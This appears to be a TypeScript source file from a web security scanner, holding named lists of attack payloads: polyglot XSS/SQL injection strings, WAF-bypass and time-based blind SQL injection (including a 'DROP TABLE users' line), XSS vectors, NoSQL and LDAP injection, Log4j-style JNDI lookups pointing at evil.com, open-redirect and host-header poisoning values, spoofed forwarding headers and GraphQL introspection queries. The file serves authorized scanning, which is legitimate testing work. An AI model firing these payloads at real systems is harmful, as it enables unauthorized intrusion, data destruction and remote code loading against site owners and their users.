/**
 * INFERNO PAYLOAD PACK
 *
 * Demonic-grade attack payloads. WAF bypass, polyglot, encoding obfuscation.
 * Use only against authorized targets. No mercy.
 */

import { DastAttackCategory } from './types';

export interface InfernoPayload {
  payload: string;
  encoding?: 'none' | 'url' | 'double-url' | 'unicode' | 'html';
  bypasses?: string[];
}

/** Polyglot - works across SQLi, XSS, SSTI, Command Inj, LDAP. Breaks naive filters. */
export const POLYGLOT = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert()` )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()`//>";

/** WAF-bypass SQLi - fragmented, encoded, comment-injected */
export const SQLI_INFERNO: InfernoPayload[] = [
  { payload: "' OR 1=1-- -", bypasses: ['basic'] },
  { payload: "' OR 1=1#", bypasses: ['mysql'] },
  { payload: "'; WAITFOR DELAY '0:0:5'--", bypasses: ['mssql-blind'] },
  { payload: "1' AND SLEEP(5)--", bypasses: ['mysql-blind'] },
  { payload: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", bypasses: ['mysql-blind'] },
  { payload: "' OR 'x'='x", bypasses: ['generic'] },
  { payload: "') OR ('1'='1", bypasses: ['parentheses'] },
  { payload: "admin'--", bypasses: ['auth-bypass'] },
  { payload: "' UNION SELECT 1,2,3,4,5-- -", bypasses: ['union'] },
  { payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -", bypasses: ['union'] },
  { payload: "1; DROP TABLE users--", bypasses: ['stacked'] },
  { payload: "1' ORDER BY 1--", bypasses: ['column-count'] },
  { payload: "' AND 1=CONVERT(int,(SELECT @@version))--", bypasses: ['mssql-error'] },
  { payload: "%27%20OR%20%271%27%3D%271", encoding: 'url', bypasses: ['url-encode'] },
  { payload: "%2527%2520OR%2520%25271%2527%253D%25271", encoding: 'double-url', bypasses: ['double-encode'] },
  { payload: "\u0027 OR 1=1--", encoding: 'unicode', bypasses: ['unicode'] },
];

/** XSS inferno - event handlers, encodings, polyglot */
export const XSS_INFERNO: InfernoPayload[] = [
  { payload: '<script>alert(1)</script>', bypasses: ['basic'] },
  { payload: '<img src=x onerror=alert(1)>', bypasses: ['event'] },
  { payload: '<svg/onload=alert(1)>', bypasses: ['svg'] },
  { payload: '"><script>alert(1)</script>', bypasses: ['break-attr'] },
  { payload: "'-alert(1)-'", bypasses: ['string-break'] },
  { payload: '<body onload=alert(1)>', bypasses: ['body'] },
  { payload: '<iframe src="javascript:alert(1)">', bypasses: ['iframe'] },
  { payload: 'javascript:alert(1)', bypasses: ['伪protocol'] },
  { payload: 'data:text/html,<script>alert(1)</script>', bypasses: ['data-uri'] },
  { payload: '\u003cscript\u003ealert(1)\u003c/script\u003e', encoding: 'unicode' },
  { payload: '<scr<script>ipt>alert(1)</scr</script>ipt>', bypasses: ['filter-bypass'] },
  { payload: '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">', bypasses: ['html-entity'] },
  { payload: '<details open ontoggle=alert(1)>', bypasses: ['details'] },
  { payload: '<marquee onstart=alert(1)>', bypasses: ['marquee'] },
  { payload: POLYGLOT, bypasses: ['polyglot'] },
];

/** NoSQL injection - MongoDB, CouchDB */
export const NOSQL_INFERNO: InfernoPayload[] = [
  { payload: '{"$gt":""}', bypasses: ['mongodb'] },
  { payload: '{"$ne":null}', bypasses: ['mongodb'] },
  { payload: '{"$regex":".*"}', bypasses: ['mongodb-regex'] },
  { payload: '{"$where":"1==1"}', bypasses: ['mongodb-where'] },
  { payload: '{"$gt":"","$ne":""}', bypasses: ['mongodb-operator'] },
  { payload: "' || 1==1//", bypasses: ['javascript-injection'] },
  { payload: "' || '1'=='1", bypasses: ['javascript'] },
];

/** LDAP injection */
export const LDAP_INFERNO: InfernoPayload[] = [
  { payload: '*', bypasses: ['wildcard'] },
  { payload: ')(|(uid=*))(', bypasses: ['filter-injection'] },
  { payload: 'admin)(|(password=*', bypasses: ['auth-bypass'] },
  { payload: '*)(uid=*))(|(uid=*', bypasses: ['or-injection'] },
];

/** Log injection / JNDI-style (Log4j pattern - tests for similar issues) */
export const LOG_INJECTION_INFERNO: InfernoPayload[] = [
  { payload: '${jndi:ldap://evil.com/a}', bypasses: ['jndi'] },
  { payload: '${env:BAD}', bypasses: ['env'] },
  { payload: '${java:runtime}', bypasses: ['java'] },
  { payload: '%24%7Bjndi%3aldap%3a%2f%2fevil.com%2fa%7D', encoding: 'url', bypasses: ['encoded-jndi'] },
];

/** Host header / cache poisoning */
export const HOST_HEADER_INFERNO = [
  'evil.com',
  'localhost',
  '127.0.0.1',
  'attacker.com',
  'target.com@evil.com',
  'target.com.evil.com',
];

/** Open redirect */
export const OPEN_REDIRECT_INFERNO: InfernoPayload[] = [
  { payload: '//evil.com', bypasses: ['protocol-relative'] },
  { payload: 'https://evil.com', bypasses: ['absolute'] },
  { payload: '//evil.com\\@target.com', bypasses: ['at-bypass'] },
  { payload: '/\\evil.com', bypasses: ['backslash'] },
  { payload: '%0d%0a%0d%0a//evil.com', encoding: 'url' },
  { payload: '//evil.com%2516@target.com', encoding: 'url' },
];

/** HTTP Parameter Pollution */
export const HPP_INFERNO = [
  'id=1&id=2',
  'id=1&id=2&id=admin',
  'id[]=1&id[]=2',
];

/** Blind SQLi - timing (5 second sleep) - response time indicator */
export const BLIND_SQLI_TIMING = [
  "1' AND SLEEP(5)--",
  "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  "'; WAITFOR DELAY '0:0:5'--",
];

/** Critical header injection - X-Forwarded-For, X-Original-URL, etc. */
export const HEADER_INJECTION_INFERNO: Array<{ header: string; value: string }> = [
  { header: 'X-Forwarded-For', value: '127.0.0.1' },
  { header: 'X-Forwarded-Host', value: 'evil.com' },
  { header: 'X-Original-URL', value: '/admin' },
  { header: 'X-Rewrite-URL', value: '/admin' },
  { header: 'X-Forwarded-Server', value: 'evil.com' },
  { header: 'Forwarded', value: 'host=evil.com' },
  { header: 'X-Custom-IP-Authorization', value: '127.0.0.1' },
  { header: 'X-Real-IP', value: '127.0.0.1' },
  { header: 'X-Originating-IP', value: '127.0.0.1' },
];

/** GraphQL inferno - deep recursion, batch DoS */
export const GRAPHQL_INFERNO = [
  '{"query":"{ __schema { types { name fields { name } } } }"}',
  '{"query":"{ a: __typename b: __typename c: __typename d: __typename e: __typename }"}',
  '{"query":"query { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } } fragment FullType on __Type { name kind fields(includeDeprecated: true) { name args { ...InputValue } type { ...TypeRef } } } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name } } } fragment InputValue on __InputValue { name type { ...TypeRef } defaultValue }"}',
];
